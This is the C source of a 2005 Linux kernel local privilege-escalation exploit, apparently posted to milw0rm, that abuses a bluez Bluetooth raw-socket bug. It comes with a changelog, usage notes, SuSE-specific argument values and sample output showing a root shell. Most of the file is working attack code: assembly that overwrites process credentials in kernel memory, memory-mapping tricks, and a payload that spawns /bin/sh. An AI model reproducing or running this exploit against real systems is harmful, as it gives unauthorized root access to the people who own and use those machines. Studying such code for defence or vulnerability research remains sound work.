/*

Due to many responses i've improved the exploit
to cover more systems!


  ONG_BAK v0.9   [october 24th 05]
""""""""""""""""""""""""""""""""""""
o universal "shellcode" added
o try to use all possible memory regions
o bugfixes

qobaiashi@voyager:~/w00nf/kernelsploit> ./ong_bak -100222
-|-bluez local root exploit v.0.9  -by qobaiashi-
 |
 |- i've found kernel 2.6.11.4-20a-default
 |- trampoline is at 0x804869c
 |- trying...
 |- [ecx: bf8d0000 ]
 |- suitable value found!using 0xbf8d0000
 |- the time has come to push the button...
sh-3.00# exit






  ONG_BAK v0.3   [april 8th 05]
"""""""""""""""""""""""""""""""""
ong_bak now checks the value of ecx and launches
the exploit in case a suitable value has been found!



  ONG_BAK v0.1   [april 4th 05]
"""""""""""""""""""""""""""""""""

local root exploit for the bluetooth bug

usage:

the bug is quite stable so you can't realy fuck things up
if you stick to the following:

play around with the negative argument until ecx points to
our data segment:


qobaiashi@voyager:~> ./ong_bak -1002341
-|-local bluez exploit v.0.3  -by qobaiashi-
 |
 |- i've found kernel 2.6.4-52-default
 |- trying...
 |- [ecx: 0b8f0f0f ]
qobaiashi@voyager:~> ./ong_bak -10023411
-|-local bluez exploit v.0.3  -by qobaiashi-
 |
 |- i've found kernel 2.6.4-52-default
 |- trying...
 |- [ecx: 0809da40 ]
 |- suitable value found!using 0x0809da40
 |- the time has come to push the button..
qobaiashi@voyager:~> id
uid=0(root) gid=0(root) Gruppen=14(uucp),16(dialout),17(audio),33(video),100(users)
qobaiashi@voyager:~>



that's it.
unfortunately it's not yet very practicable..

qobaiashi@u-n-f.com

*/

#include <sys/klog.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <sys/utsname.h>
#include <sys/mman.h>


void usage(char *path);

//===================[ kernel 2.6* privilege elevator ]===============================
//===================[      qobaiashi@u-n-f.com       ]===============================
//globals
int uid, gid;

extern load_highlevel;
__asm__
(
"load_highlevel:         \n"
"xor    %eax, %eax       \n"
"mov    $0xffffe000, %eax\n"
"and    %esp,%eax        \n"
"pushl  %eax             \n"
"call   set_root         \n"
"pop    %eax             \n"
//ret to userspace-2.6.* version
" cli                    \n"
" pushl $0x7b            \n"      //DS user selector
" pop   %ds              \n"
" pushl %ds              \n"      //SS
" pushl $0xc0000000      \n"      //ESP
" pushl $0x246           \n"      //EFLAGS
" pushl $0x73            \n"      //CS user selector
" pushl $shellcode       \n"      //EIP must not be a push /bin/sh shellcode!!
"iret                    \n"
);

void set_root(unsigned int *ts)
{
ts = (int*)*ts;
int cntr;
//hope you guys are int aligned
for(cntr = 0; cntr <= 512; cntr++, ts++)
    if( ts[0] == uid && ts[1] == uid && ts[4] == gid && ts[5] == gid)
      ts[0] = ts[1] = ts[4] = ts[5] = 0;

}


void shellcode()
{
system("/bin/sh");
exit(0);
}
//====================================================================================
//====================================================================================





main(int argc, char *argv[])
{
char buf[2048];
int sock, *mod = (int*)buf;
int *linker = 0;

unsigned int arg;
int tmp;
char *check;
struct utsname vers;

gid  = getgid();
uid  = getuid();

printf("-|-bluez local root exploit v.0.9  -by qobaiashi-\n |\n");
if (uname(&vers) < 0)
   printf(" |- couldn't determine kernel version\n");

else
    printf(" |- i've found kernel %s\n", vers.release);


printf(" |- trampoline is at %p\n", &load_highlevel);


if (argc < 2)
   {
    usage(argv[0]);
    exit(1);
    }

if (argc == 2)
    arg = strtoul(argv[1], 0, 0);


if (fork() != 0)//parent watch the Oops
   {
    //previous Oops printing
   usleep(1000);
   if ((tmp = klogctl(0x3, buf, 1700)) > -1)
       {
        check = strstr(buf, "ecx: ");
        printf(" |- [%0.14s]\n", check);
        check+=5;
        *(check+9) = 0x00;*(--check) = 'x';*(--check) = '0';
        mod = (unsigned int*)strtoul(check, 0, 0);
        //page align FIXME: might be booggy
        int *ecx = mod;
        mod = (int)mod &~ 0x00000fff;
        linker =
mmap((void*)mod,0x2000,PROT_WRITE|PROT_READ,MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED,0,0);
        if(linker == mod)//we could mmap the area
          {
           printf(" |- suitable value found!using %p\n", mod);
           printf(" |- the time has come to push the button... \n");
           for (sock = 0;sock <= 1;sock++)          //use ecx
                *(ecx++) = (int)&load_highlevel;   //link to shellcode
           }

           else
             {
              printf(" |- could not mmap   %p\n", mod);
              if( brk((void*)mod+0x200 ) == -1)
                {
                 printf(" |- could not brk to %p\n", mod);
                 printf(" `-------------------------------\n");
                 exit(-1);
                 }
              //here we did it
              printf(" |- suitable value found!using %p\n", mod);
              printf(" |- the time has come to push the button... \n");
              for (sock = 0;sock <= 1;sock++)          //use ecx
                  *(ecx++) = (int)&load_highlevel;    //link to shellcode

              }
           if ((sock = socket(AF_BLUETOOTH, SOCK_RAW, arg)) < 0)
               exit(1);

        }
   return 0;
   }

if (fork() == 0)//child does the pre-exploit
{
  printf(" |- trying...\n");
  if ((sock = socket(AF_BLUETOOTH, SOCK_RAW, arg)) < 0)
      {
      printf(" |- something went w0rng (invalid value)\n");
      exit(1);
     }
}

exit(0);
}



/*****************\
|**    usage    **|
\*****************/
void usage(char *path)
{
printf(" |----------------------------\n");
printf(" | usage: %s <negative value> \n", path);
printf(" | tested:\n");
printf(" | SuSE 9.1:      -10023411  \n");
printf(" |                -41122122 \n");
printf(" | Kernel 2.6.11: -10023 \n");
printf(" | SuSE 9.3:      -100222\n");
printf(" |                -102901\n");
printf(" `-----------------------\n");
exit(0);
}

// 1st post: milw0rm.com [2005-04-09]

// milw0rm.com [2005-10-26]